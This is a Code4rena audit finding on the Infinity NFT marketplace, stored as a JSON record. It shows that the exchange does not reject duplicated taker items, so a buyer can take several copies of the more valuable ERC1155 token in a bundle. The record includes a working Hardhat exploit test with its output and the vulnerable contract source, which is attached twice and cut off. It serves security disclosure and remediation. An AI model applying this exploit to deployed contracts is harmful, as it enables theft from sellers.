{
  "Title": "[H-03] `canExecTakeOrder` mismatches `makerOrder` and `takerItems` when duplicated items present",
  "Content": "_Submitted by PwnedNoMore, also found by 0xsanson, hyh, k, throttle, and zzzitron_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L154-L164>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L336-L364>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L178-L243>\n\n### Impact\n\nWhen any user provides a `sellOrder` and they are trying to sell multiple tokens from *n* (n > 1) different `ERC1155` collections in a single order, hakcers can get the tokens of most expensive collections (with n times of the original amount) by paying the same price.\n\nIn short, hackers can violate the user-defined orders.\n\n### Root Cause\n\nThe logic of `canExecTakeOrder` and `canExecMatchOneToMany` is not correct.\n\n**Let's take ` canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)  ` as an example, while `canExecMatchOneToMany` shares the same error.**\n\nSpecifically, it first checks whether the number of selling item in `makerOrder` matches with the ones in `takerItems`. Note that the number is an aggregated one. Then, it check whether all the items in `takerItems` are within the scope defined by `makerOrder`.\n\nThe problem comes when there are duplicated items in `takerItems`. The aggregated number would be correct and all taker's Items are indeed in the order. However, it does not means `takerItems` exactly matches all items in `makerOrder`, which means violation of the order.\n\nFor example, if the order requires\n\n```\n[\n    {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n    },\n    {\n          collection: mock1155Contract2.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n    }\n];\n\n```\n\nand the taker provides\n\n    [\n        {\n              collection: mock1155Contract1.address,\n              tokens: [{ tokenId: 0, numTokens: 1 }]\n        },\n        {\n              collection: mock1155Contract1.address,\n              tokens: [{ tokenId: 0, numTokens: 1 }]\n        }\n    ];\n\nThe taker can grabs two `mock1155Contract1` tokens by paying the order which tries to sell a `mock1155Contract1` token and a `mock1155Contract2` token. When `mock1155Contract1` is much more expensive, the victim user will suffer from a huge loss.\n\nAs for the approving issue, the users may grant the contract unlimited access, or they may have another order which sells `mock1155Contract1` tokens. The attack is easy to perform.\n\n### Proof of Concept\n\nFirst put the `MockERC1155.sol` under the `contracts/` directory:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\nimport {ERC1155URIStorage} from '@openzeppelin/contracts/token/ERC1155/extensions/ERC1155URIStorage.sol';\nimport {ERC1155} from '@openzeppelin/contracts/token/ERC1155/ERC1155.sol';\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\n\ncontract MockERC1155 is ERC1155URIStorage, Ownable {\n  uint256 numMints;\n\n  constructor(string memory uri) ERC1155(uri) {}\n\n  function mint(address to, uint256 id, uint256 amount, bytes memory data) external onlyOwner {\n    super._mint(to, id, amount, data);\n  }\n}\n```\n\nAnd then put `poc.js` under the `test/` directory.\n\n```js\nconst { expect } = require('chai');\nconst { ethers, network } = require('hardhat');\nconst { deployContract, NULL_ADDRESS, nowSeconds } = require('../tasks/utils');\nconst {\n  getCurrentSignedOrderPrice,\n  approveERC20,\n  grantApprovals,\n  signOBOrder\n} = require('../helpers/orders');\n\nasync function prepare1155OBOrder(user, chainId, signer, order, infinityExchange) {\n  // grant approvals\n  const approvals = await grantApprovals(user, order, signer, infinityExchange.address);\n  if (!approvals) {\n    return undefined;\n  }\n\n  // sign order\n  const signedOBOrder = await signOBOrder(chainId, infinityExchange.address, order, signer);\n\n  const isSigValid = await infinityExchange.verifyOrderSig(signedOBOrder);\n  if (!isSigValid) {\n    console.error('Signature is invalid');\n    return undefined;\n  }\n  return signedOBOrder;\n}\n\ndescribe('PoC', function () {\n  let signers,\n    dev,\n    matchExecutor,\n    victim,\n    hacker,\n    token,\n    infinityExchange,\n    mock1155Contract1,\n    mock1155Contract2,\n    obComplication\n\n  const sellOrders = [];\n\n  let orderNonce = 0;\n\n  const UNIT = toBN(1e18);\n  const INITIAL_SUPPLY = toBN(1_000_000).mul(UNIT);\n\n  const totalNFTSupply = 100;\n  const numNFTsToTransfer = 50;\n  const numNFTsLeft = totalNFTSupply - numNFTsToTransfer;\n\n  function toBN(val) {\n    return ethers.BigNumber.from(val.toString());\n  }\n\n  before(async () => {\n    // signers\n    signers = await ethers.getSigners();\n    dev = signers[0];\n    matchExecutor = signers[1];\n    victim = signers[2];\n    hacker = signers[3];\n    // token\n    token = await deployContract('MockERC20', await ethers.getContractFactory('MockERC20'), signers[0]);\n\n    // NFT constracts (ERC1155)\n    mock1155Contract1 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [\n      'uri1'\n    ]);\n    mock1155Contract2 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [\n      'uri2'\n    ]);\n\n    // Exchange\n    infinityExchange = await deployContract(\n      'InfinityExchange',\n      await ethers.getContractFactory('InfinityExchange'),\n      dev,\n      [token.address, matchExecutor.address]\n    );\n\n    // OB complication\n    obComplication = await deployContract(\n      'InfinityOrderBookComplication',\n      await ethers.getContractFactory('InfinityOrderBookComplication'),\n      dev\n    );\n\n    // add currencies to registry\n    await infinityExchange.addCurrency(token.address);\n    await infinityExchange.addCurrency(NULL_ADDRESS);\n\n    // add complications to registry\n    await infinityExchange.addComplication(obComplication.address);\n\n    // send assets\n    await token.transfer(victim.address, INITIAL_SUPPLY.div(4).toString());\n    await token.transfer(hacker.address, INITIAL_SUPPLY.div(4).toString());\n    for (let i = 0; i < numNFTsToTransfer; i++) {\n      await mock1155Contract1.mint(victim.address, i, 50, '0x');\n      await mock1155Contract2.mint(victim.address, i, 50, '0x');\n    }\n  });\n\n  describe('StealERC1155ByDuplicateItems', () => {\n    it('Passed test denotes successful hack', async function () {\n      // prepare order\n      const user = {\n        address: victim.address\n      };\n      const chainId = network.config.chainId ?? 31337;\n      const nfts = [\n        {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        },\n        {\n          collection: mock1155Contract2.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        }\n      ];\n      const execParams = { complicationAddress: obComplication.address, currencyAddress: token.address };\n      const extraParams = {};\n      const nonce = ++orderNonce;\n      const orderId = ethers.utils.solidityKeccak256(['address', 'uint256', 'uint256'], [user.address, nonce, chainId]);\n      let numItems = 0;\n      for (const nft of nfts) {\n        numItems += nft.tokens.length;\n      }\n      const order = {\n        id: orderId,\n        chainId,\n        isSellOrder: true,\n        signerAddress: user.address,\n        numItems,\n        startPrice: ethers.utils.parseEther('1'),\n        endPrice: ethers.utils.parseEther('1'),\n        startTime: nowSeconds(),\n        endTime: nowSeconds().add(10 * 60),\n        nonce,\n        nfts,\n        execParams,\n        extraParams\n      };\n      const sellOrder = await prepare1155OBOrder(user, chainId, victim, order, infinityExchange);\n      expect(sellOrder).to.not.be.undefined;\n\n      // form matching nfts\n      const nfts_ = [\n        {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        },\n        {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        }\n      ];\n\n      // approve currency\n      let salePrice = getCurrentSignedOrderPrice(sellOrder);\n      await approveERC20(hacker.address, token.address, salePrice, hacker, infinityExchange.address);\n\n      // perform exchange\n      await infinityExchange.connect(hacker).takeOrders([sellOrder], [nfts_]);\n\n      // owners after sale\n      // XXX: note that the user's intention is to send mock1155Contract1 x 1 + mock1155Contract2 x 1\n      // When mock1155Contract1 is much more expensive than mock1155Contract2, user suffers from huge loss\n      expect(await mock1155Contract1.balanceOf(hacker.address, 0)).to.equal(2);\n    });\n  });\n});\n```\n\nAnd run\n\n```bash\n$ npx hardhat test --grep PoC\n\n  PoC\n    StealERC1155ByDuplicateItems\n      âœ“ Passed test denotes successful hack\n```\n\nNote that the passed test denotes a successful hack.\n\n### Recommended Mitigation Steps\n\nI would suggest a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.\n\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/12#issuecomment-1162897771):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/bbbd362f18a2bb1992620a76e59621132b8a3d8c.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/12#issuecomment-1179560900):**\n> This is a High risk issue. The PoC demonstrates how a maker specifying a bundle of NFTs could incorrectly have one ERC1155 item in that bundle processed several times by the taker - the bundle is not fully accepted as expected, the item processed multiple times is essentially overfilled, and this may be abused to the taker's advantage when the NFTs are not valued the same.\n\n\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-06-infinity-nft-marketplace-contest",
  "Code": [
    {
      "filename": "contracts/core/InfinityOrderBookComplication.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\n\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\n\nimport {OrderTypes} from '../libs/OrderTypes.sol';\nimport {IComplication} from '../interfaces/IComplication.sol';\n\n/**\n * @title InfinityOrderBookComplication\n * @author nneverlander. Twitter @nneverlander\n * @notice Complication to execute orderbook orders\n */\ncontract InfinityOrderBookComplication is IComplication, Ownable {\n  // ======================================================= EXTERNAL FUNCTIONS ==================================================\n\n  /**\n   * @notice Checks whether one to one matches can be executed\n   * @dev This function is called by the main exchange to check whether one to one matches can be executed.\n          It checks whether orders have the right constraints - i.e they have one NFT only, whether time is still valid,\n          prices are valid and whether the nfts intersect\n   * @param makerOrder1 first makerOrder\n   * @param makerOrder2 second makerOrder\n   * @return returns whether the order can be executed and the execution price\n   */\n  function canExecMatchOneToOne(OrderTypes.MakerOrder calldata makerOrder1, OrderTypes.MakerOrder calldata makerOrder2)\n    external\n    view\n    override\n    returns (bool, uint256)\n  {\n    bool numItemsValid = makerOrder2.constraints[0] == makerOrder1.constraints[0] &&\n      makerOrder2.constraints[0] == 1 &&\n      makerOrder2.nfts.length == 1 &&\n      makerOrder2.nfts[0].tokens.length == 1 &&\n      makerOrder1.nfts.length == 1 &&\n      makerOrder1.nfts[0].tokens.length == 1;\n    bool _isTimeValid = makerOrder2.constraints[3] <= block.timestamp &&\n      makerOrder2.constraints[4] >= block.timestamp &&\n      makerOrder1.constraints[3] <= block.timestamp &&\n      makerOrder1.constraints[4] >= block.timestamp;\n    bool _isPriceValid = false;\n    uint256 makerOrder1Price = _getCurrentPrice(makerOrder1);\n    uint256 makerOrder2Price = _getCurrentPrice(makerOrder2);\n    uint256 execPrice;\n    if (makerOrder1.isSellOrder) {\n      _isPriceValid = makerOrder2Price >= makerOrder1Price;\n      execPrice = makerOrder1Price;\n    } else {\n      _isPriceValid = makerOrder1Price >= makerOrder2Price;\n      execPrice = makerOrder2Price;\n    }\n    return (\n      numItemsValid && _isTimeValid && doItemsIntersect(makerOrder1.nfts, makerOrder2.nfts) && _isPriceValid,\n      execPrice\n    );\n  }\n\n  /**\n   * @notice Checks whether one to matches matches can be executed\n   * @dev This function is called by the main exchange to check whether one to many matches can be executed.\n          It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid,\n          prices are valid and whether the nfts intersect\n   * @param makerOrder the one makerOrder\n   * @param manyMakerOrders many maker orders\n   * @return returns whether the order can be executed\n   */\n  function canExecMatchOneToMany(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external view override returns (bool) {\n    uint256 numItems;\n    bool isOrdersTimeValid = true;\n    bool itemsIntersect = true;\n    uint256 ordersLength = manyMakerOrders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      if (!isOrdersTimeValid || !itemsIntersect) {\n        return false; // short circuit\n      }\n\n      uint256 nftsLength = manyMakerOrders[i].nfts.length;\n      for (uint256 j = 0; j < nftsLength; ) {\n        numItems += manyMakerOrders[i].nfts[j].tokens.length;\n        unchecked {\n          ++j;\n        }\n      }\n\n      isOrdersTimeValid =\n        isOrdersTimeValid &&\n        manyMakerOrders[i].constraints[3] <= block.timestamp &&\n        manyMakerOrders[i].constraints[4] >= block.timestamp;\n\n      itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    bool _isTimeValid = isOrdersTimeValid &&\n      makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] >= block.timestamp;\n\n    uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);\n    uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);\n\n    bool _isPriceValid = false;\n    if (makerOrder.isSellOrder) {\n      _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;\n    } else {\n      _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;\n    }\n\n    return (numItems == makerOrder.constraints[0]) && _isTimeValid && itemsIntersect && _isPriceValid;\n  }\n\n  /**\n   * @notice Checks whether match orders with a higher order intent can be executed\n   * @dev This function is called by the main exchange to check whether one to one matches can be executed.\n          It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid,\n          prices are valid and whether the nfts intersect\n   * @param sell sell order\n   * @param buy buy order\n   * @param constructedNfts - nfts constructed by the off chain matching engine\n   * @return returns whether the order can be executed and the execution price\n   */\n  function canExecMatchOrder(\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts\n  ) external view override returns (bool, uint256) {\n    (bool _isPriceValid, uint256 execPrice) = isPriceValid(sell, buy);\n    return (\n      isTimeValid(sell, buy) &&\n        _isPriceValid &&\n        areNumItemsValid(sell, buy, constructedNfts) &&\n        doItemsIntersect(sell.nfts, constructedNfts) &&\n        doItemsIntersect(buy.nfts, constructedNfts) &&\n        doItemsIntersect(sell.nfts, buy.nfts),\n      execPrice\n    );\n  }\n\n  /**\n   * @notice Checks whether take orders with a higher order intent can be executed\n   * @dev This function is called by the main exchange to check whether take orders with a higher order intent can be executed.\n          It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid\n          and whether the nfts intersect\n   * @param makerOrder the maker order\n   * @param takerItems the taker items specified by the taker\n   * @return returns whether order can be executed\n   */\n  function canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n    external\n    view\n    override\n    returns (bool)\n  {\n    return (makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] >= block.timestamp &&\n      areTakerNumItemsValid(makerOrder, takerItems) &&\n      doItemsIntersect(makerOrder.nfts, takerItems));\n  }\n\n  // ======================================================= PUBLIC FUNCTIONS ==================================================\n\n  /// @dev checks whether the orders are active and not expired\n  function isTimeValid(OrderTypes.MakerOrder calldata sell, OrderTypes.MakerOrder calldata buy)\n    public\n    view\n    returns (bool)\n  {\n    return\n      sell.constraints[3] <= block.timestamp &&\n      sell.constraints[4] >= block.timestamp &&\n      buy.constraints[3] <= block.timestamp &&\n      buy.constraints[4] >= block.timestamp;\n  }\n\n  /// @dev checks whether the price is valid; a buy order should always have a higher price than a sell order\n  function isPriceValid(OrderTypes.MakerOrder calldata sell, OrderTypes.MakerOrder calldata buy)\n    public\n    view\n    returns (bool, uint256)\n  {\n    (uint256 currentSellPrice, uint256 currentBuyPrice) = (_getCurrentPrice(sell), _getCurrentPrice(buy));\n    return (currentBuyPrice >= currentSellPrice, currentSellPrice);\n  }\n\n  /// @dev sanity check to make sure the constructed nfts conform to the user signed constraints\n  function areNumItemsValid(\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts\n  ) public pure returns (bool) {\n    uint256 numConstructedItems = 0;\n    uint256 nftsLength = constructedNfts.length;\n    for (uint256 i = 0; i < nftsLength; ) {\n      unchecked {\n        numConstructedItems += constructedNfts[i].tokens.length;\n        ++i;\n      }\n    }\n    return numConstructedItems >= buy.constraints[0] && buy.constraints[0] <= sell.constraints[0];\n  }\n\n  /// @dev sanity check to make sure that a taker is specifying the right number of items\n  function areTakerNumItemsValid(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n    public\n    pure\n    returns (bool)\n  {\n    uint256 numTakerItems = 0;\n    uint256 nftsLength = takerItems.length;\n    for (uint256 i = 0; i < nftsLength; ) {\n      unchecked {\n        numTakerItems += takerItems[i].tokens.length;\n        ++i;\n      }\n    }\n    return makerOrder.constraints[0] == numTakerItems;\n  }\n\n  /**\n   * @notice Checks whether nfts intersect\n   * @dev This function checks whether there are intersecting nfts between two orders\n   * @param order1Nfts nfts in the first order\n   * @param order2Nfts nfts in the second order\n   * @return returns whether items intersect\n   */\n  function doItemsIntersect(OrderTypes.OrderItem[] calldata order1Nfts, OrderTypes.OrderItem[] calldata order2Nfts)\n    public\n    pure\n    returns (bool)\n  {\n    uint256 order1NftsLength = order1Nfts.length;\n    uint256 order2NftsLength = order2Nfts.length;\n    // case where maker/taker didn't specify any items\n    if (order1NftsLength == 0 || order2NftsLength == 0) {\n      return true;\n    }\n\n    uint256 numCollsMatched = 0;\n    // check if taker has all items in maker\n    for (uint256 i = 0; i < order2NftsLength; ) {\n      for (uint256 j = 0; j < order1NftsLength; ) {\n        if (order1Nfts[j].collection == order2Nfts[i].collection) {\n          // increment numCollsMatched\n          unchecked {\n            ++numCollsMatched;\n          }\n          // check if tokenIds intersect\n          bool tokenIdsIntersect = doTokenIdsIntersect(order1Nfts[j], order2Nfts[i]);\n          require(tokenIdsIntersect, 'tokenIds dont intersect');\n          // short circuit\n          break;\n        }\n        unchecked {\n          ++j;\n        }\n      }\n      unchecked {\n        ++i;\n      }\n    }\n\n    return numCollsMatched == order2NftsLength;\n  }\n\n  /**\n   * @notice Checks whether tokenIds intersect\n   * @dev This function checks whether there are intersecting tokenIds between two order items\n   * @param item1 first item\n   * @param item2 second item\n   * @return returns whether tokenIds intersect\n   */\n  function doTokenIdsIntersect(OrderTypes.OrderItem calldata item1, OrderTypes.OrderItem calldata item2)\n    public\n    pure\n    returns (bool)\n  {\n    uint256 item1TokensLength = item1.tokens.length;\n    uint256 item2TokensLength = item2.tokens.length;\n    // case where maker/taker didn't specify any tokenIds for this collection\n    if (item1TokensLength == 0 || item2TokensLength == 0) {\n      return true;\n    }\n    uint256 numTokenIdsPerCollMatched = 0;\n    for (uint256 k = 0; k < item2TokensLength; ) {\n      for (uint256 l = 0; l < item1TokensLength; ) {\n        if (\n          item1.tokens[l].tokenId == item2.tokens[k].tokenId && item1.tokens[l].numTokens == item2.tokens[k].numTokens\n        ) {\n          // increment numTokenIdsPerCollMatched\n          unchecked {\n            ++numTokenIdsPerCollMatched;\n          }\n          // short circuit\n          break;\n        }\n        unchecked {\n          ++l;\n        }\n      }\n      unchecked {\n        ++k;\n      }\n    }\n\n    return numTokenIdsPerCollMatched == item2TokensLength;\n  }\n\n  // ======================================================= UTILS ============================================================\n\n  /// @dev returns the sum of current order prices; used in match one to many orders\n  function _sumCurrentPrices(OrderTypes.MakerOrder[] calldata orders) internal view returns (uint256) {\n    uint256 sum = 0;\n    uint256 ordersLength = orders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      sum += _getCurrentPrice(orders[i]);\n      unchecked {\n        ++i;\n      }\n    }\n    return sum;\n  }\n\n  /// @dev Gets current order price for orders that vary in price over time (dutch and reverse dutch auctions)\n  function _getCurrentPrice(OrderTypes.MakerOrder calldata order) internal view returns (uint256) {\n    (uint256 startPrice, uint256 endPrice) = (order.constraints[1], order.constraints[2]);\n    uint256 duration = order.constraints[4] - order.constraints[3];\n    uint256 priceDiff = startPrice > endPrice ? startPrice - endPrice : endPrice - startPrice;\n    if (priceDiff == 0 || duration == 0) {\n      return startPrice;\n    }\n    uint256 elapsedTime = block.timestamp - order.constraints[3];\n    uint256 PRECISION = 10**4; // precision for division; similar to bps\n    uint256 portionBps = elapsedTime > duration ? PRECISION : ((elapsedTime * PRECISION) / duration);\n    priceDiff = (priceDiff * portionBps) / PRECISION;\n    return startPrice > endPrice ? startPrice - priceDiff : startPrice + priceDiff;\n  }\n}"
    },
    {
      "filename": "contracts/core/InfinityOrderBookComplication.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\n\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\n\nimport {OrderTypes} from '../libs/OrderTypes.sol';\nimport {IComplication} from '../interfaces/IComplication.sol';\n\n/**\n * @title InfinityOrderBookComplication\n * @author nneverlander. Twitter @nneverlander\n * @notice Complication to execute orderbook orders\n */\ncontract InfinityOrderBookComplication is IComplication, Ownable {\n  // ======================================================= EXTERNAL FUNCTIONS ==================================================\n\n  /**\n   * @notice Checks whether one to one matches can be executed\n   * @dev This function is called by the main exchange to check whether one to one matches can be executed.\n          It checks whether orders have the right constraints - i.e they have one NFT only, whether time is still valid,\n          prices are valid and whether the nfts intersect\n   * @param makerOrder1 first makerOrder\n   * @param makerOrder2 second makerOrder\n   * @return returns whether the order can be executed and the execution price\n   */\n  function canExecMatchOneToOne(OrderTypes.MakerOrder calldata makerOrder1, OrderTypes.MakerOrder calldata makerOrder2)\n    external\n    view\n    override\n    returns (bool, uint256)\n  {\n    bool numItemsValid = makerOrder2.constraints[0] == makerOrder1.constraints[0] &&\n      makerOrder2.constraints[0] == 1 &&\n      makerOrder2.nfts.length == 1 &&\n      makerOrder2.nfts[0].tokens.length == 1 &&\n      makerOrder1.nfts.length == 1 &&\n      makerOrder1.nfts[0].tokens.length == 1;\n    bool _isTimeValid = makerOrder2.constraints[3] <= block.timestamp &&\n      makerOrder2.constraints[4] >= block.timestamp &&\n      makerOrder1.constraints[3] <= block.timestamp &&\n      makerOrder1.constraints[4] >= block.timestamp;\n    bool _isPriceValid = false;\n    uint256 makerOrder1Price = _getCurrentPrice(makerOrder1);\n    uint256 makerOrder2Price = _getCurrentPrice(makerOrder2);\n    uint256 execPrice;\n    if (makerOrder1.isSellOrder) {\n      _isPriceValid = makerOrder2Price >= makerOrder1Price;\n      execPrice = makerOrder1Price;\n    } else {\n      _isPriceValid = makerOrder1Price >= makerOrder2Price;\n      execPrice = makerOrder2Price;\n    }\n    return (\n      numItemsValid && _isTimeValid && doItemsIntersect(makerOrder1.nfts, makerOrder2.nfts) && _isPriceValid,\n      execPrice\n    );\n  }\n\n  /**\n   * @notice Checks whether one to matches matches can be executed\n   * @dev This function is called by the main exchange to check whether one to many matches can be executed.\n          It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid,\n          prices are valid and whether the nfts intersect\n   * @param makerOrder the one makerOrder\n   * @param manyMakerOrders many maker orders\n   * @return returns whether the order can be executed\n   */\n  function canExecMatchOneToMany(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external view override returns (bool) {\n    uint256 numItems;\n    bool isOrdersTimeValid = true;\n    bool itemsIntersect = true;\n    uint256 ordersLength = manyMakerOrders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      if (!isOrdersTimeValid || !itemsIntersect) {\n        return false; // short circuit\n      }\n\n      uint256 nftsLength = manyMakerOrders[i].nfts.length;\n      for (uint256 j = 0; j < nftsLength; ) {\n        numItems += manyMakerOrders[i].nfts[j].tokens.length;\n        unchecked {\n          ++j;\n        }\n      }\n\n      isOrdersTimeValid =\n        isOrdersTimeValid &&\n        manyMakerOrders[i].constraints[3] <= block.timestamp &&\n        manyMakerOrders[i].constraints[4] >= block.timestamp;\n\n      itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    bool _isTimeValid = isOrdersTimeValid &&\n      makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] >= block.timestamp;\n\n    uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);\n    uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);\n\n    bool _isPriceValid = false;\n    if (makerOrder.isSellOrder) {\n      _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;\n    } else {\n      _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;\n    }\n\n    return (numItems == makerOrder.constraints[0]) && _isTimeValid && itemsIntersect && _isPriceValid;\n  }\n\n  /**\n   * @notice Checks whether match orders with a higher order intent can be executed\n   * @dev This function is called by the main exchange to check whether one to one matches can be executed.\n          It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid,\n          prices are valid and whether the nfts intersect\n   * @param sell sell order\n   * @param buy buy order\n   * @param constructedNfts - nfts constructed by the off chain matching engine\n   * @return returns whether the order can be executed and the execution price\n   */\n  function canExecMatchOrder(\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts\n  ) external view override returns (bool, uint256) {\n    (bool _isPriceValid, uint256 execPrice) = isPriceValid(sell, buy);\n    return (\n      isTimeValid(sell, buy) &&\n        _isPriceValid &&\n        areNumItemsValid(sell, buy, constructedNfts) &&\n        doItemsIntersect(sell.nfts, constructedNfts) &&\n        doItemsIntersect(buy.nfts, constructedNfts) &&\n        doItemsIntersect(sell.nfts, buy.nfts),\n      execPrice\n    );\n  }\n\n  /**\n   * @notice Checks whether take orders with a higher order intent can be executed\n   * @dev This function is called by the main exchange to check whether take orders with a higher order intent can be executed.\n          It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid\n          and whether the nfts intersect\n   * @param makerOrder the maker order\n   * @param takerItems the taker items specified by the taker\n   * @return returns whether order can be executed\n   */\n  function canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n    external\n    view\n    override\n    returns (bool)\n  {\n    return (makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] >= block.timestamp &&\n      areTakerNumItemsValid(makerOrder, takerItems) &&\n      doItemsIntersect(makerOrder.nfts, takerItems));\n  }\n\n  // ======================================================= PUBLIC FUNCTIONS ==================================================\n\n  /// @dev checks whether the orders are active and not expired\n  function isTimeValid(OrderTypes.MakerOrder calldata sell, OrderTypes.MakerOrder calldata buy)\n    public\n    view\n    returns (bool)\n  {\n    return\n      sell.constraints[3] <= block.timestamp &&\n      sell.constraints[4] >= block.timestamp &&\n      buy.constraints[3] <= block.timestamp &&\n      buy.constraints[4] >= block.timestamp;\n  }\n\n  /// @dev checks whether the price is valid; a buy order should always have a higher price than a sell order\n  function isPriceValid(OrderTypes.MakerOrder calldata sell, OrderTypes.MakerOrder calldata buy)\n    public\n    view\n    returns (bool, uint256)\n  {\n    (uint256 currentSellPrice, uint256 currentBuyPrice) = (_getCurrentPrice(sell), _getCurrentPrice(buy));\n    return (currentBuyPrice >= currentSellPrice, currentSellPrice);\n  }\n\n  /// @dev sanity check to make sure the constructed nfts conform to the user signed constraints\n  function areNumItemsValid(\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts\n  ) public pure returns (bool) {\n    uint256 numConstructedItems = 0;\n    uint256 nftsLength = constructedNfts.length;\n    for (uint256 i = 0; i < nftsLength; ) {\n      unchecked {\n        numConstructedItems += constructedNfts[i].tokens.length;\n        ++i;\n      }\n    }\n    return numConstructedItems >= buy.constraints[0] && buy.constraints[0] <= sell.constraints[0];\n  }\n\n  /// @dev sanity check to make sure that a taker is specifying the right number of items\n  function areTakerNumItemsValid(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n    public\n    pure\n    returns (bool)\n  {\n    uint256 numTakerItems = 0;\n    uint256 nftsLength = takerItems.length;\n    for (uint256 i = 0; i < nftsLength; ) {\n      unchecked {\n        numTakerItems += takerItems[i].tokens.length;\n        ++i;\n      }\n    }\n    return makerOrder.constraints[0] == numTakerItems;\n  }\n\n  /**\n   * @notice Checks whether nfts intersect\n   * @dev This function checks whether there are intersecting nfts between two orders\n   * @param order1Nfts nfts in the first order\n   * @param order2Nfts nfts in the second order\n   * @return returns whether items intersect\n   */\n  function doItemsIntersect(OrderTypes.OrderItem[] calldata order1Nfts, OrderTypes.OrderItem[] calldata order2Nfts)\n    public\n    pure\n    returns (bool)\n  {\n    uint256 order1NftsLength = order1Nfts.length;\n    uint256 order2NftsLength = order2Nfts.length;\n    // case where maker/taker didn't specify any items\n    if (order1NftsLength == 0 || order2NftsLength == 0) {\n      return true;\n    }\n\n    uint256 numCollsMatched = 0;\n    // check if taker has all items in maker\n    for (uint256 i = 0; i < order2NftsLength; ) {\n      for (uint256 j = 0; j < order1NftsLength; ) {\n        if (order1Nfts[j].collection == order2Nfts[i].collection) {\n          // increment numCollsMatched\n          unchecked {\n            ++numCollsMatched;\n          }\n          // check if tokenIds intersect\n          bool tokenIdsIntersect = doTokenIdsIntersect(order1Nfts[j], order2Nfts[i]);\n          require(tokenIdsIntersect, 'tokenIds dont intersect');\n          // short circuit\n          break;\n        }\n        unchecked {\n          ++j;\n        }\n      }\n      unchecked {\n        ++i;\n      }\n    }\n\n    return numCollsMatched == order2NftsLength;\n  }\n\n  /**\n   * @notice Checks whether tokenIds intersect\n   * @dev This function checks whether there are intersecting 